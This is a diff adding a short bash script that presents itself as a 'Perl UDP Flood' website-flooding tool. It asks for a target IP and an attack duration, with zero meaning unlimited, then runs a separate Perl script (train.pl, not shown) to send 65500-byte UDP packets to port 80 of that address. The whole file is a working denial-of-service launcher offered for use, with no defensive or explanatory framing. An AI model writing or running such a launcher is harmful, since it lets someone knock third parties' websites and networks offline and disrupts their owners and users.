@@ -1,0 +1,13 @@
+#!/bin/bash
+clear
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo " ~~~      Perl UDP Flood : Realtalk         ~~~ "
+echo " ~~~   Website Flooding Script Hold It Off  ~~~ "
+echo " ~~~~~~~~~~~  CTRL-C To Stop Flood  ~~~~~~~~~~~ "
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo "Enter IP :"
+read ip
+echo "Attack Time (0 For Unlimited Flood) :"
+read time
+./train.pl $ip 80 65500 $time
+
